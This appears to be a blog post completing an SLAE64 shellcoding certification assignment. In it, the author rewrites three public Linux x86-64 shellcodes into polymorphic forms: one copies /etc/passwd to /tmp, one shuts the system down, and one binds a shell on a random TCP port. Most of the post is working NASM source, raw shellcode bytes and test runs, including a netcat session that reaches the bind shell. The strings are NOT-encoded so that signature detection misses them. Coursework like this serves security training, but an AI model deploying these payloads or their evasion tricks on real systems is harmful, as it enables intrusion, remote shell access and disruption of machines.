---
layout: single
title: SLAE64 Assignment 6 - Polymorphic Shellcodes
date: 2020-6-08
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING64.png
tags:
    - Shellcoding
    - Linux
    - x64
    - SLAE64
---

![](/assets/images/slae/SHELLCODING64.png)

## Introduction
  
The goal of this sixth assignement is to create polymorphic versions of three shellcodes from [Shell Storm](http://shell-storm.org/shellcode/)  
These versions cannot be larger than 150% of the original shellcode and we get bonus points to make them shorter.  

All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE64/tree/master/Assignment-06-Polymorphic_shellcodes)

## Shellcodes

The payloads I've chosen are :

 - [Reads data from /etc/passwd to /tmp/outfile - 118 bytes by Chris Higgins](http://shell-storm.org/shellcode/files/shellcode-867.php) (Polymorph version -25 bytes)  
 - [shutdown -h now - 65 bytes by Osanda Malith Jayathissa](http://shell-storm.org/shellcode/files/shellcode-877.php) (Polymorph version +3 bytes with not strings)
 - [shell bind TCP random port - 57 bytes by Geyslan G. Bem](http://shell-storm.org/shellcode/files/shellcode-859.php) (Polymorph version -2 bytes with not string)

## Reads data from /etc/passwd to /tmp/outfile

The source code is as follow :  
**Size : 118 bytes**
```nasm
    ; open("/etc/password", O_RDONLY)
        xor rax, rax
        mov al, 2			; open syscall value
        xor rdi, rdi			; RDI set to 0
        mov rbx, 0x647773		; 
        push rbx			; push '\x00dws'		
        mov rbx, 0x7361702f6374652f
        push rbx			; push 'sap/cte/'
        lea rdi, [rsp]			; RDI point to '/etc/password\x00'
        xor rsi, rsi			; RSI O_RDONLY
        syscall				; exec open

    ; read(fd, *buffer, 65535)
        mov rbx, rax			; save fd to RBX
        xor rax, rax			; read syscall value
        mov rdi, rbx			; copy fd to RDI
        mov rsi, rsp			; RSI point on top of the stack 
					; (to write /etc/passwd content)
        mov dx, 0xFFFF			; size : 65535 bytes
        syscall				; exec read

    ; open("/tmp/outfile", (O_RDWR, O_CREATE (and I'm not sure), 07777) 
    ;  o146 see /usr/include/x86_64-linux-gnu/bits/fcntl-linux.h
        mov r8, rax			; copy number of bytes read
        mov rax, rsp			; save pointer to /etc/password contents
        xor rbx, rbx
        push rbx			; string terminator
        mov rbx, 0x656c6966		 
        push rbx			; push 'elif'
        mov rbx, 0x74756f2f706d742f
        push rbx			; push 'tuo/pmt/'
        mov rbx, rax			; RBX point to /etc/password contents
        xor rax, rax
        mov al, 2			; open syscall value
        lea rdi, [rsp]			; RDI point to '/tmp/outfile\x00'
        xor rsi, rsi			
        push 0x66
        pop si				; flags O_RDWR, O_CREATE
					; RDX already set 07777
        syscall				; exec open


    ; write("/tmp/outfile", *buf, count)
        mov rdi, rax			; pointer to "/tmp/outfile\x00"
        xor rax, rax
        mov al, 1			; write syscall value
        lea rsi, [rbx]			; RSI point to the memory address value
					; of the /etc/password file, stored in memory 
        xor rdx, rdx
        mov rdx, r8			; copy number of bytes read in /etc/password
					; to RDX the number of bytes to write arguments
        syscall				; exec write
```

Polymorphic version :  
**Size : 93 bytes**
```nasm
    ; open("/etc/password", O_RDONLY)
        xor esi, esi			; RSI O_RDONLY
        mul esi				; RDI, RAX, RDX = 0
        push rax			; string terminator
        mov ecx, 0x64777373		; 'dwss'
        push rcx			
        mov rcx, 0x61702f2f6374652f	; 'ap//cte/
        push rcx
        mov rdi, rsp			; RDI point to "/etc/passwd"
        mov al, 2			; open syscall value
        syscall                  	; exec open

    ; read(fd, *buffer, 65535)
        xchg rsi, rdi			; RSI point to the top of the stack
					; to write data that will be read from fd
        xchg edi, eax			; EDI = file descriptor
        mov eax, edx			; read syscall value
        or dx, 0xFFFF			; count bytes to read
        syscall				; exec read

        xchg r13, rax			; save number of bytes read
        mov rbx, rsp			; RBX point to datas read

    ; open("/tmp/outfile", (O_RDWR, O_CREATE..), 07777) 
        xor eax, eax
        push rax			; String terminator
        xchg eax, esi			; RSI set to 0
        mov rax, 0x656c6966
        push rax			; push 'elif'
        mov rax, 0x74756f2f706d742f
        push rax			; push 'tuo/pmt/'
        xor eax, eax
        mov al, 0x66			
        xchg eax, esi			; RSI set to flags
        mov al, 2			; open syscall value
        mov rdi, rsp			; RDI point to "/tmp/outfile"
        syscall				; exec open

    ; write("/tmp/outfile", *buf, count)
        mov edi, eax			; RDI set to fd for /tmp/outfile
        xor eax, eax			
        inc eax				; write syscall number
        lea rsi, [rbx]			; RSI point to data from /etc/passwd
					; stored in the stack
        xchg rdx, r13			; RDX set to number of bytes to write
					; (same as the number of bytes read from /etc/passwd)
        syscall				; exec write
```

Original shellcode :  
\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb**\x73\x77\x64**\x00\x53\x48\xbb**\x2f\x65\x74**
**\x63\x2f\x70\x61**\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48
\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89
\xe0\x48\x31\xdb\x53\xbb**\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x2f\x6f**
**\x75\x74**\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a
\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c
\x89\xc2\x0f\x05

The new shellcode :  
\x31\xf6\xf7\xe6\x50\xb9**\x73\x73\x77\x64**\x51\x48\xb9**\x2f\x65\x74\x63\x2f\x2f**
**\x70\x61**\x51\x48\x89\xe7\xb0\x02\x0f\x05\x48\x87\xf7\x97\x89\xd0\x66\x83\xca
\xff\x0f\x05\x49\x95\x48\x89\xe3\x31\xc0\x50\x96\xb8**\x66\x69\x6c\x65\x50\x48**
**\xb8\x2f\x74\x6d\x70\x2f\x6f\x75\x74**\x50\x31\xc0\xb0\x66\x96\xb0\x02\x48\x89
\xe7\x0f\x05\x89\xc7\x31\xc0\xff\xc0\x48\x8d\x33\x49\x87\xd5\x0f\x05

Final size -25 bytes, null bytes free and we retrieve only the strings and the syscall opcodes.

```plaintext
skrox@kali:~$ ls -l /tmp/outfile
ls: impossible d'accéder à '/tmp/outfile': Aucun fichier ou dossier de ce type
skrox@kali:~$ ./read-poly 
len: 93 bytes
Erreur de segmentation
skrox@kali:~$ ls -l /tmp/outfile
-rwxr-xr-t 1 skrox skrox 2078 juin   7 01:11 /tmp/outfile

```

## shutdown -h now 

The original code is as follow :  
**Size : 65 bytes**
```nasm
	xor rax, rax
	xor rdx, rdx 		     ; RAX, RDX set 0

	push rax		     ; '\x00'
	push byte 0x77		     ; 'w'
	push word 0x6f6e             ; 'on'
	mov rbx, rsp		     ; RBX point to "now"

	push rax		     ; '\x00'
	push word 0x682d 	     ; 'h-'
	mov rcx, rsp		     ; RCX point to "-h"

	push rax                    ; '\x00'
	mov r8, 0x2f2f2f6e6962732f  ; ///nibs/
	mov r10, 0x6e776f6474756873 ; nwodtuhs
	push r10		
	push r8
	mov rdi, rsp	            ; RDI point to "/sbin///shutdown"

	push rdx
	push rbx
	push rcx
	push rdi
	mov rsi, rsp		    ; RSI point to ["/bin///shutdown","-h","now']

	add rax, 59		    ; execve syscall
	syscall			    ; syscall exec
```

Polymorphic version :  
**Size : 68 bytes (+3 bytes)**
```nasm
	mov rax, 0xff889091ffff97d2	; string not encoded
	not rax				; decode
	push rax			 
	lea rcx, [rsp+4]		; RCX point to "now\x00"
	mov rsi, rsp			; RSI point to "-h\x00"

	mov rax, 0xff9188909b8b8a97	; string not encoded
	not rax				; decode
	push rax
	mov rax, 0x8cd0d091969d8cd0	; string not encoded
	not rax				; decode
	push rax
	mov rdi, rsp			; RDI point to "/sbin//shutdown\x00"

	cdq				; RDX null pointer
	push rdx			; array terminator
	push rcx
	push rsi
	push rdi
	lea rsi, [rsp]			; RSI point to argv[]

	mov eax, edx
	mov al, 59			; execve syscall value
	syscall				; exec execve
```

Original shellcode :
\x48\x31\xc0\x48\x31\xd2\x50\x6a\x77\x66\x68\x6e\x6f\x48\x89\xe3\x50\x66\x68
\x2d\x68\x48\x89\xe1\x50\x49\xb8\x2f\x73\x62\x69\x6e\x2f\x2f\x2f\x49\xba\x73
\x68\x75\x74\x64\x6f\x77\x6e\x41\x52\x41**\x50\x48\x89\xe7**\x52\x53\x51\x57\x48
\x89\xe6\x48\x83\xc0**\x3b\x0f\x05**

The new shellcode :
\x48\xb8\xd2\x97\xff\xff\x91\x90\x88\xff\x48\xf7\xd0\x50\x48\x8d\x4c\x24\x04
\x48\x89\xe6\x48\xb8\x97\x8a\x8b\x9b\x90\x88\x91\xff\x48\xf7\xd0\x50\x48\xb8
\xd0\x8c\x9d\x96\x91\xd0\xd0\x8c\x48\xf7\xd0**\x50\x48\x89\xe7**\x99\x52\x51\x56
\x57\x48\x8d\x34\x24\x89\xd0\xb0**\x3b\x0f\x05**

It shutdown the system where it is run nothing more.

## bind TCP random port 

The original code is as follow (gdb dump) :  
**Size : 57 bytes**
```nasm
Dump of assembler code for function code:

   ;socket(AF_INET,SOCK_STREAM, 0)
=> 0x0000555555558060 <+0>:	xor    rsi,rsi
   0x0000555555558063 <+3>:	mul    rsi		; RAX,RDX,RSI set to 0
   0x0000555555558066 <+6>:	inc    esi		; SOCK_STREAM
   0x0000555555558068 <+8>:	push   0x2
   0x000055555555806a <+10>:	pop    rdi		; AF_INET
   0x000055555555806b <+11>:	mov    al,0x29		; socket syscall value
   0x000055555555806d <+13>:	syscall 		; exec socket

   ; listen(sockfd, 0)
   ; Here I've learned that we can use listen without bind, and a random is assigned
   0x000055555555806f <+15>:	push   rdx		
   0x0000555555558070 <+16>:	pop    rsi		; backlog 0
   0x0000555555558071 <+17>:	push   rax
   0x0000555555558072 <+18>:	pop    rdi		; sockfd
   0x0000555555558073 <+19>:	mov    al,0x32		; listen syscall value
   0x0000555555558075 <+21>:	syscall 		; exec listen

   ;accept(sockfd, null, null)
   0x0000555555558077 <+23>:	mov    al,0x2b		; accept syscall value
   0x0000555555558079 <+25>:	syscall 		; exec accept

   ; dup2(sockfd, stdX) loop
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi		; in theory set to 3 (stderr + 1)
   0x000055555555807d <+29>:	xchg   rdi,rax		; RDI set to accept sockfd
   ;loop:
   0x000055555555807f <+31>:	dec    esi		; counter from 2 to 0 (stderr to stdin)
   0x0000555555558081 <+33>:	mov    al,0x21		; dup2 syscall value
   0x0000555555558083 <+35>:	syscall 		; exec syscall
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31> ; loop until RSI = 0

   ; execve("//bin/sh", null, null)
   0x0000555555558087 <+39>:	push   rdx		; string terminator
   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f 
   0x0000555555558092 <+50>:	push   rdi
   0x0000555555558093 <+51>:	push   rsp
   0x0000555555558094 <+52>:	pop    rdi		; point to "//bin/sh"
   0x0000555555558095 <+53>:	mov    al,0x3b          ; execve syscall value
   0x0000555555558097 <+55>:	syscall 		; exec execve
```

Polymorphic version :  
**Size : 55 bytes**
```nasm
_start:
	push 0x1
	push 0x2
	push 0x29
	pop rax		; socket syscall value
	pop rdi		; AF_INET
	pop rsi		; SOCK_STREAM
	cdq		; RDX 0	
	syscall		; exec socket(AF_INET, SOCK_STREAM, 0)

	dec esi		; backlog 0
	xchg eax, edi	
	add al, 0x30	; 0x32, listen syscall value
	syscall 	; exec listen(sockfd, 0)

	add al, 0x2b	; accept syscall value
			; (listen return 0 on success) 
	syscall 	; exec accept(sockfd, null, null)

	xchg eax, edi   ; EDI new sockfd, EAX 3 
loop:
	dec    eax	; first then next stdX
	mov sil, 0x21	
	xchg eax, esi	; ESI counter, EAX dup2 syscall value
	syscall 	; dup2(sockfd, stdX) return the stdX value in EAX
	jne    loop	; loop until syscall return 0

	mov rbx, 0xff978cd091969dd0  ; ~'/bin/sh\x00'
	not rbx
	push   rbx
	mov rdi, rsp	; RDI point to "/bin/sh\x00"
	add al, 0x3b	; execve syscall value (RAX set to 0 by last dup2 syscall)
	syscall		; exec execve("/bin/sh",null,null)
```

Original shellcode :  
\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29**\x0f\x05**\x52\x5e\x50\x5f
\xb0\x32**\x0f\x05**\xb0\x2b**\x0f\x05**\x57\x5e\x48\x97\xff\xce\xb0\x21\x0f\x05\x75
\xf8\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0**\x3b\x0f\x05**

The new shellcode :  
\x6a\x01\x6a\x02\x6a\x29\x58\x5f\x5e\x99**\x0f\x05**\xff\xce\x97\x04\x30**\x0f\x05**
\x04\x2b\x0f\x05\x97\xff\xc8\x40\xb6\x21\x96**\x0f\x05**\x75\xf6\x48\xbb\xd0\x9d
\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x04**\x3b\x0f\x05**

Only the syscall opcodes are the same, the string is obfuscated and all other instructions are modified.

```plaintext
skrox@kali:~/$ gcc -fno-stack-protector -z execstack bind-random-poly.c -o bind-random-poly
skrox@kali:~$ ./bind-random-poly 
Shellcode Length:  55

#And on another terminal
skrox@kali:~$ netstat -antp |grep bind-random
tcp        0      0 0.0.0.0:58367           0.0.0.0:*               LISTEN      15684/./bind-random 
skrox@kali:~$ nc -nv 127.0.0.1 58367
(UNKNOWN) [127.0.0.1] 58367 (?) open
id
uid=1000(skrox) gid=1000(skrox) groups=1000(skrox)
```
And it's all for this one, thanks for reading :)

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-
linux/index.html)  
Student ID: PA-14186***